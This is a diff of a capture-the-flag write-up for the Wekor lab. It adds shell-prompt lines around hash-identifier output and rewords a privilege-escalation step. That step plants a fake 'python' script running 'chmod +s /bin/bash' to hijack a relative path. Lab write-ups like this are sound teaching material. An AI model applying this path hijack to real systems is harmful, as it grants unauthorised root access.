@@ -314,6 +314,9 @@ No password hashes loaded (see FAQ)
 
 **Wait. Not loaded? Let me check it's hash type via `hash-identifier`:**
 ```
+┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
+└─# hash-identifier 
+[...]
  HASH: $P${Redacted}
 
  Not Found.
@@ -322,6 +325,9 @@ No password hashes loaded (see FAQ)
 Hmm... That weird. **How about other 3 users hash?**
 
 ```
+┌──(root🌸siunam)-[~/ctf/thm/ctf/Wekor]
+└─# hash-identifier 
+[...]
  HASH: $P${Redacted}
 
 Possible Hashs:
@@ -772,7 +778,7 @@ drwxr-xr-x   6 root root 4.0K Jan 23  2021 src
 
 **To exploit this relative path, I'll:**
 
-- Create a malicious "python" binary that will add SUID sticky bit into `/bin/bash`, and mark it as executable:
+- Create a malicious "python" Bash script that will add SUID sticky bit into `/bin/bash`, and mark it as executable:
 
 ```
 Orka@osboxes:/usr/sbin$ echo "chmod +s /bin/bash" > python
